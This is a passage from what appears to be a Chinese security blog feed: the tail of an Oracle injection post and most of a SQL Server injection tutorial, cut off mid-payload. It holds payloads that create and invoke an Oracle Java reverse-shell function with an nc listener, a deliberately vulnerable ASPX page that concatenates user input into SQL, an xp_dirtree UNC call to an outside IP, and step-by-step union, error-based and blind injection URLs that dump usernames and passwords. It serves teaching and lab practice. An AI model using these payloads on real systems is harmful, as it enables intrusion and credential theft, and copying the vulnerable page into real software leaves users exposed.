dual</span><br></pre></td></tr></table></figure>

<p><strong>创建函数</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace function reversetcp RETURN VARCHAR2 as language java name &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;shell.run() return String&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><strong>赋予函数执行权限</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;grant all on reversetcp to public&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sys.reversetcp <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p>shell命令行输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -vv -l p 8080</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061110384.png" alt="image-20211006110855525" style="zoom:50%;">]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLServer数据库注入攻击方式</title>
    <url>/post/6daae3c4.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="SQLServer数据库基本知识"><a href="#SQLServer数据库基本知识" class="headerlink" title="SQLServer数据库基本知识"></a>SQLServer数据库基本知识</h2><h3 id="SQLServer数据库介绍"><a href="#SQLServer数据库介绍" class="headerlink" title="SQLServer数据库介绍"></a>SQLServer数据库介绍</h3><p>SQLServer是美国Microsoft公司推出的一种关系型数据库系统。SQLServer是一个可扩展的、高性能的、为分布式客户机/服务器计算所设计的数据库管理系统，实现了与WindowsNT的有机结合，提供了基于事务的企业级信息管理系统方案。SQLServer数据库也称MSSQL数据库。</p>
<p>其主要特点如下：</p>
<ul>
<li>高性能设计，可充分利用WindowsNT的优势</li>
<li>系统管理先进，支持Windows图形化管理工具，支持本地和远程的系统管理和配置。</li>
<li>强壮的事务处理功能，采用各种方法保证数据的完整性。</li>
<li>支持对称多处理器结构、存储过程、ODBC，并具有自主的SQL语言。 SQLServer以其内置的数据复制功能、强大的管理工具、与Internet的紧密集成和开放的系统结构为广大的用户、开发人员和系统集成商提供了一个出众的数据库平台。</li>
</ul>
<p>SQLServer服务默认端口：1433</p>
<h3 id="三个权限级别"><a href="#三个权限级别" class="headerlink" title="三个权限级别"></a>三个权限级别</h3><ul>
<li>sa权限：数据库操作，文件管理，命令执行，注册表读取等。SQLServer数据库的最高权限。相当于系统system权限。</li>
<li>db权限：文件管理，数据库操作等权限。相当于系统users-administrators权限。</li>
<li>public权限：数据库操作。相当于系统guest-users权限。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断是否是SA权限</span><br><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;)     </span><br><span class="line"></span><br><span class="line">判断是否是db_owner权限  </span><br><span class="line">select is_member(&#x27;db_owner&#x27;)</span><br><span class="line"></span><br><span class="line">判断是否是public权限</span><br><span class="line">select is_srvrolemember(&#x27;public&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061050350.png" alt="c78b253a8e43fa7216abbae7c5330902.png"></p>
<h3 id="六个默认数据库"><a href="#六个默认数据库" class="headerlink" title="六个默认数据库"></a>六个默认数据库</h3><p>SQLServer数据库有6个默认的库，分别是4个系统数据库：<code>master</code> 、<code>model</code> 、<code>msdb</code> 、<code>tempdb</code>，和2个实例数据库：<code>ReportServer</code>、<code>ReportServerTempDB</code>。其中，系统数据库 <code>model</code> 和 <code>tempdb</code> 默认是没有数据表的。</p>
<ul>
<li>master数据库：master数据库控制SQL Server的所有方面。这个数据库中包括所有的配置信息、用户登录信息、当前正在服务器中运行的过程的信息。</li>
<li>model数据库：model数据库是建立所有用户数据库时的模板。当你建立一个新数据库时，SQL Server会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满。</li>
<li>msdb数据库：msdb数据库是SQL Server中的一个特例。如果你查看这个数据库的实际定义，会发现它其实是一个用户数据库。不同之处是SQL Server拿这个数据库来做什么。所有的任务调度、报警、操作员都存储在msdb数据库中。该库的另一个功能是用来存储所有备份历史。SQL Server Agent将会使用这个库。</li>
<li>tempdb数据库：tempdb数据库是一个非常特殊的数据库，供所有来访问你的SQL Server的用户使用。这个库用来保存所有的临时表、存储过程和其他SQL Server建立的临时用的东西。例如，排序时要用到tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建。永远不要在tempdb数据库建立需要永久保存的表。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061050615.png" alt="img"></p>
<p>但是如果用navicat远程连接的话，只会显示2个实例数据库：<code>ReportServer</code>、<code>ReportServerTempDB</code></p>
<h3 id="三个特殊表"><a href="#三个特殊表" class="headerlink" title="三个特殊表"></a>三个特殊表</h3><p>SQLServer中master数据库，控制SQL Server系统的所有系统级信息，例如：登录账户信息、链接服务器和系统配置设置、记录其他所有数据库的存在，数据文件的位置、 SQL Server的初始化信息等。如果master数据库不可用，则无法启动SQL Server，下有主要的三个特殊的表：</p>
<ul>
<li>sysdatabases 管理已经存在的数据库</li>
<li>sysobjects 管理已经存在的表</li>
<li>syscolumns 管理表中字段</li>
</ul>
<h3 id="T-SQL"><a href="#T-SQL" class="headerlink" title="T-SQL"></a>T-SQL</h3><p>T-SQL 即 Transact-SQL，是 SQL 在 Microsoft SQL Server 上的增强版，它是用来让应用程式与 SQL Server 沟通的主要语言。T-SQL 提供标准 SQL 的 DDL 和 DML 功能，加上延伸的函数、系统预存程序以及程式设计结构(例如 IF 和 WHILE)让程式设计更有弹性。</p>
<p>T-SQL包括以下4个部分：</p>
<ul>
<li>DDL：定义和管理数据库及其对象，例如create、alter和drop等。</li>
<li>DML：实现对数据库表各对象的操作，例如insert、update等。</li>
<li>DCL：数据控制语言，实现对数据库进行安全管理和权限管理等控制，例如grant、revoke、deny等。</li>
<li>附加的语言元素。T-SQL的附加语言元素，包括变量、运算符、函数、注释和流程控制语句等。</li>
</ul>
<h3 id="常用系统函数"><a href="#常用系统函数" class="headerlink" title="常用系统函数"></a>常用系统函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">suser_name() 用户登录名</span><br><span class="line">user_name() 用户在数据库中的名字</span><br><span class="line">user 用户在数据库中的名字</span><br><span class="line">show_role() 对当前用户起作用的规则</span><br><span class="line">db_name() 数据库名</span><br><span class="line">object_name(obj_id) 数据库对象名</span><br><span class="line">col_name(obj_id,col_id) 列名</span><br><span class="line">col_length(objname,colname) 列长度</span><br><span class="line">valid_name(char_expr) 是否是有效标识符</span><br></pre></td></tr></table></figure>

<h3 id="常用查询语句"><a href="#常用查询语句" class="headerlink" title="常用查询语句"></a>常用查询语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@version;       #查询数据库的版本</span><br><span class="line">select @@servername;    #查询服务名</span><br><span class="line">select host_name();     #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字</span><br><span class="line">select db_name();       #查询当前数据库名</span><br><span class="line">select db_name(1);      #查询第一个数据库名</span><br><span class="line">select db_name(2);      #查询第二个数据库名</span><br><span class="line">select user;            #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner </span><br><span class="line">use tempdb              #切换到tempdb表</span><br><span class="line"></span><br><span class="line">top n                   #查询前n条记录</span><br><span class="line">xtype = &#x27;U&#x27;				#代表指定显示用户创建的表</span><br><span class="line">xtype = &#x27;X&#x27;				#代表显示扩展存储过程</span><br><span class="line"></span><br><span class="line">select substring(&#x27;string&#x27;,2,1)     #截取给定字符串的索引为2的1个字符</span><br><span class="line">select ascii(&#x27;a&#x27;)                  #查询给定字符串的ascii值</span><br><span class="line">select len(&#x27;string&#x27;)               #查询给定字符串的长度</span><br><span class="line">EXEC sp_spaceused @updateusage = N&#x27;TRUE&#x27;;  #查询当前数据库的大小</span><br><span class="line">sp_spaceused &#x27;表名&#x27;                #查询指定表名的大小</span><br><span class="line">EXEC master.sys.xp_dirtree &#x27;\\192.168.106.5\xx.txt&#x27;,0,1;</span><br><span class="line"> </span><br><span class="line">判断是否是SA权限</span><br><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;)     </span><br><span class="line">判断是否是db_owner权限  </span><br><span class="line">select is_member(&#x27;db_owner&#x27;)</span><br><span class="line">判断是否是public权限</span><br><span class="line">select is_srvrolemember(&#x27;public&#x27;)</span><br><span class="line"></span><br><span class="line">判断是否为站库分离</span><br><span class="line">select host_name()=@@servername</span><br><span class="line"></span><br><span class="line">#数据库的连接</span><br><span class="line">server=127.0.0.1;UID=sa;PWD=123456;database=master;Provider=SQLOLEDB</span><br><span class="line">mssql://sa:123456@127.0.0.1/XCCMS_SocialBusinessDB</span><br><span class="line"> </span><br><span class="line">count(name)是查询总数</span><br><span class="line">name是查询名字</span><br><span class="line">*是查询详细信息</span><br><span class="line"> </span><br><span class="line">#查询数据库</span><br><span class="line">select count(name) from sysdatabases     #查询数据库的个数,只有当前数据库是master的时候，才能执行该命令</span><br><span class="line">select name  from sysdatabases           #查询数据库的名字</span><br><span class="line">select * from sysdatabases               #查询所有数据库的信息</span><br><span class="line"> </span><br><span class="line">#查询数据表</span><br><span class="line">select count(name) from sysobjects where type=&#x27;U&#x27; #查询当前数据库中表的个数</span><br><span class="line">select name from sysobjects where type=&#x27;U&#x27;  #查询当前数据库中所有表的名字</span><br><span class="line">select * from sysobjects where type=&#x27;U&#x27;    #查询当前数据库的所有表的详细信息</span><br><span class="line"> </span><br><span class="line">select count(name) from test..sysobjects where xtype=&#x27;U&#x27;  #查询指定test数据库中表的个数</span><br><span class="line">select name from test..sysobjects where xtype=&#x27;U&#x27;         #查询指定test数据库中表的名字</span><br><span class="line">select * from test..sysobjects where xtype=&#x27;U&#x27;            #查询指定test数据库中表的详细信息</span><br><span class="line"> </span><br><span class="line">#查询列</span><br><span class="line">select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)            #查询当前数据库的指定users表的列的个数</span><br><span class="line">select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)         #查询当前数据库的指定users表的所有列的名字</span><br><span class="line">select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)      #查询当前数据库的指定users表的列的详细信息</span><br><span class="line"> </span><br><span class="line">select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)     #查询指定test数据库的指定users表的列的个数</span><br><span class="line">select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的所有列的名字</span><br><span class="line">select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的列的详细信息</span><br><span class="line"> </span><br><span class="line">#查询数据</span><br><span class="line">select count(*) from test..users          #查询test数据库user表的数据的条数</span><br><span class="line">select * from test..users                 #查询test数据库user表的所有数据</span><br></pre></td></tr></table></figure>

<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
<li>操作系统：Windows Server 2008R2</li>
<li>数据库：Microsoft SQL Server 2008R2</li>
<li>Web服务器：IIS75-CN</li>
<li>脚本语言：aspx</li>
<li>源代码：index.aspx</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Data&quot; %&gt;</span><br><span class="line">&lt;%@ Import namespace=&quot;System.Data.SqlClient&quot;  %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;script runat=&quot;server&quot;&gt;</span><br><span class="line">     private DataSet resSet=new DataSet();</span><br><span class="line">    protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        String strconn = &quot;server=.;database=test;uid=sa;pwd=admin&quot;;</span><br><span class="line">        string id = Request.Params[&quot;id&quot;];</span><br><span class="line">        string sql = string.Format(&quot;select * from newss where id=&#123;0&#125;&quot;, id);</span><br><span class="line">        SqlConnection connection=new SqlConnection(strconn);</span><br><span class="line">        connection.Open();</span><br><span class="line">        SqlDataAdapter dataAdapter = new SqlDataAdapter(sql, connection);</span><br><span class="line">        dataAdapter.Fill(resSet);</span><br><span class="line">        DgData.DataSource = resSet.Tables[0];</span><br><span class="line">        DgData.DataBind();</span><br><span class="line">        Response.Write(&quot;执行语句:&lt;br&gt;&quot;+sql);</span><br><span class="line">        Response.Write(&quot;&lt;br&gt;结果为:&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head runat=&quot;server&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;</span><br><span class="line">    &lt;title&gt;SQLServer注入测试&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;asp:DataGrid ID=&quot;DgData&quot; runat=&quot;server&quot; BackColor=&quot;White&quot; BorderColor=&quot;#3366CC&quot; </span><br><span class="line">            BorderStyle=&quot;None&quot; BorderWidth=&quot;1px&quot; CellPadding=&quot;4&quot; </span><br><span class="line">                HeaderStyle-CssClass=&quot;head&quot; Width=&quot;203px&quot;&gt;</span><br><span class="line">            &lt;FooterStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">            &lt;SelectedItemStyle BackColor=&quot;#009999&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCFF99&quot; /&gt;</span><br><span class="line">            &lt;PagerStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; HorizontalAlign=&quot;Left&quot; </span><br><span class="line">                Mode=&quot;NumericPages&quot; /&gt;</span><br><span class="line">            &lt;ItemStyle BackColor=&quot;White&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">&lt;HeaderStyle CssClass=&quot;head&quot; BackColor=&quot;#003399&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCCCFF&quot;&gt;&lt;/HeaderStyle&gt;</span><br><span class="line">        &lt;/asp:DataGrid&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>数字型</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1/</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1-0</span><br><span class="line"></span><br><span class="line">若加斜杠(/)报错，-0返回正常，说明存在注入点，闭合类型为数字型</span><br></pre></td></tr></table></figure>

<p><strong>字符型</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line"></span><br><span class="line">若前者回显正常，后者回显异常，说明存在注入点，闭合类型为字符型</span><br></pre></td></tr></table></figure>

<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and (select count(*) from sysobjects)&gt;0</span><br><span class="line"></span><br><span class="line">若返回正常，说明该数据库为mssql</span><br></pre></td></tr></table></figure>

<h3 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 order by 3</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 order by 4</span><br></pre></td></tr></table></figure>

<h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=-1 union select null,null,null 	#先使用NULL填充列数</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select 1,&#x27;2&#x27;,&#x27;3&#x27;			#先用数字填充，若报错，则用字符填充</span><br></pre></td></tr></table></figure>

<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=-1 union select 1,@@version,&#x27;3&#x27;	#获取数据库版本信息</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select 1,db_name(),&#x27;3&#x27;	#获取当前数据库名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select 1,db_name(1),&#x27;3&#x27;	#获取第1个数据库名</span><br></pre></td></tr></table></figure>

<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=-1 union select 1,name,&#x27;3&#x27; from test.sys.sysobjects where xtype=&#x27;U&#x27; 		#获取test数据库的所有表名（若可以显示多行数据）</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select top 1 1,name,&#x27;3&#x27; from test.sys.sysobjects where xtype=&#x27;U&#x27;	#获取test数据库的第1张表名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select top 1 1,name,&#x27;3&#x27; from test.sys.sysobjects where xtype=&#x27;U&#x27; and name &lt;&gt; &#x27;newss&#x27;		#获取test数据库的第1张不为&#x27;newss&#x27;的表名（即第2张表名）</span><br></pre></td></tr></table></figure>

<h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=-1 union select 1,name,&#x27;3&#x27; from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;) 	#获取test数据库下的users表的所有字段名（若可以显示多行数据）</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select top 1 1,name,&#x27;3&#x27; from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;)	#获取test数据库下users表的第1个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select top 1 1,name,&#x27;3&#x27; from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;) and name &lt;&gt; &#x27;id&#x27;	#获取test数据库下users表的第1个不为&#x27;id&#x27;的字段名（即第2个字段名）</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select top 1 1,name,&#x27;3&#x27; from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;) and name &lt;&gt; &#x27;id&#x27; and name &lt;&gt; &#x27;username&#x27; #获取test数据库下users表的第1个不为&#x27;id&#x27;且不为&#x27;username&#x27;的字段名（即第3个字段名）</span><br></pre></td></tr></table></figure>

<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=-1 union select 1,username,password from users			#获取所有数据（若可以显示多行数据）</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select top 1 1,username,password from users	#获取第1个数据</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select top 1 1,username,password from users where username &lt;&gt; &#x27;admin&#x27;	#获取username不为&#x27;admin&#x27;的数据（第2个数据）</span><br></pre></td></tr></table></figure>

<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and 1=(@@version)			#获取数据库版本信息</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and 1=(select db_name())		#获取当前数据库</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and 1=(select db_name(1))	#获取第1个数据库名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and 1=(select name from master..sysdatabases for xml path)	#获取所有数据库名</span><br></pre></td></tr></table></figure>

<h3 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and 1=(select top 1 name from test.sys.sysobjects where xtype=&#x27;U&#x27;)	#获取test数据库的第1张表名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and 1=(select top 1 name from test.sys.sysobjects where xtype=&#x27;U&#x27; and name &lt;&gt; &#x27;newss&#x27;)			#获取test数据库的第1张不为&#x27;newss&#x27;的表名（即第2张表名）</span><br></pre></td></tr></table></figure>

<h3 id="获取字段名-1"><a href="#获取字段名-1" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and 1=(select top 1 name from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;))		#获取test数据库下users表的第1个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and 1=(select top 1 name from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;) and name &lt;&gt; &#x27;id&#x27;)	#获取test数据库下users表的第1个不为&#x27;id&#x27;的字段名（即第2个字段名）</span><br></pre></td></tr></table></figure>

<h3 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and 1=(select top 1 username from users)		#获取第1个数据</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and 1=(select top 1 username from users where username &lt;&gt; &#x27;admin&#x27;) #获取username不为&#x27;admin&#x27;的数据（第2个数据）</span><br></pre></td></tr></table></figure>

<h2 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h2><h3 id="判断数据库的数量"><a href="#判断数据库的数量" class="headerlink" title="判断数据库的数量"></a>判断数据库的数量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and (select count(*) from master..sysdatabases)&gt;7 	#判断数据库数量（包括4个系统数据库）</span><br></pre></td></tr></table></figure>

<h3 id="判断数据库长度"><a href="#判断数据库长度" class="headerlink" title="判断数据库长度"></a>判断数据库长度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and len(db_name())&gt;3			#判断当前数据库的长度</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and len(db_name(1))&gt;3		#判断第1个数据库的长度</span><br></pre></td></tr></table></figure>

<h3 id="猜解数据库名"><a href="#猜解数据库名" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and ascii(substring((select db_name()),1,1))&gt;100 	#若回显正常说明当前数据库第1个字符的ASCII码值大于100</span><br></pre></td></tr></table></figure>

<h3 id="判断数据库中表的数量"><a href="#判断数据库中表的数量" class="headerlink" title="判断数据库中表的数量"></a>判断数据库中表的数量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and (select count(*) from test.sys.sysobjects where xtype=&#x27;U&#x27;)&gt;2</span><br></pre></td></tr></table></figure>

<h3 id="判断数据库中表的长度"><a href="#判断数据库中表的长度" class="headerlink" title="判断数据库中表的长度"></a>判断数据库中表的长度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and (select top 1 len(name) from test..sysobjects where xtype=&#x27;U&#x27;)&gt;3		#判断第1张表的长度</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and (select top 1 len(name) from test..sysobjects where xtype=&#x27;U&#x27; and name not in (select top 1 name from test.sys.sysobjects where xtype=&#x27;U&#x27;))&gt;3		#判断第2张表的长度</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and (select top 1 len(name) from test..sysobjects where xtype=&#x27;U&#x27; and name not in (select top 2 name from test.sys.sysobjects where xtype=&#x27;U&#x27;))&gt;3		#判断第3张表的长度</span><br></pre></td></tr></table></figure>

<h3 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and (select ascii(substring((select top 1 name from test..sysobjects where xtype=&#x27;U&#x27;),1,1)))&gt;100	#猜解第1张表的表名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and (select ascii(substring((select top 1 name from test..sysobjects where xtype=&#x27;U&#x27; and name not in (select top 1 name from test.sys.sysobjects where xtype=&#x27;U&#x27;)),1,1)))&gt;100	#猜解第2张表的表名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and (select ascii(substring((select top 1 name from test..sysobjects where xtype=&#x27;U&#x27; and name not in (select top 2 name from test.sys.sysobjects where xtype=&#x27;U&#x27;)),1,1)))&gt;100	#猜解第3张表的表名</span><br></pre></td></tr></table></figure>

<h3 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and (select count(*) from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;))&gt;2	#判断users表的字段数量</span><br></pre></td></tr></table></figure>

<h3 id="判断字段的长度"><a href="#判断字段的长度" class="headerlink" title="判断字段的长度"></a>判断字段的长度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and (select top 1 len(name) from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;))&gt;1	#判断users表的第1个字段的长度</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and (select top 1 len(name) from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)))&gt;1	#判断users表的第2个字段的长度</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and (select top 1 len(name) from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 2 name 